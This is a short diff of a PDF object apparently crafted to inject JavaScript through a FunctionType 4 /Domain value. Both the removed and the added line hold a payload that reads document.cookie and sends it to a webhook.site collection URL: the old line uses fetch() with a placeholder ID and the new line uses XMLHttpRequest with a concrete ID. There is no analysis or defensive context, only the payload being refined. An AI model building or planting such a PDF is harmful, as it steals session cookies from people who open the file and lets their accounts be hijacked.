@@ -2,7 +2,9 @@
 1 0 obj
 <<
   /FunctionType 4
-  /Domain [(fetch('https://webhook.site/你的专属ID?c='+encodeURIComponent(document.cookie))) 0]
+  /Domain [(var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://webhook.site/1aceba09-6f1f-4bd8-afca-dab0603f504f?c=' + encodeURIComponent(document.cookie), true);
+xhr.send();) 0]
   /Range [0 0]
   /Length 12
 >>
